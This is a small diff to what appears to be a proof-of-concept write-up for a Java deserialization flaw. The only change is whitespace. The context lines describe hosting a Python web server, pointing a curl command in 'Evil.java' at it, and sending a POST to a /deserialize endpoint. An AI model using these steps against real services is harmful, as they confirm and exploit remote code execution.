@@ -29,7 +29,7 @@
     - `PoC` - `curl`:
       - We run a web server via `python3 -m http.server 82`
       - Now, we adjust the IP address of the `curl` command in `Evil.java` to wherever this web server is running
-      - Last, we send a request to our API:
+      - Last, we send a request to our API:  
         POST /deserialize  
         Content-Type: application/json  
         <br />  
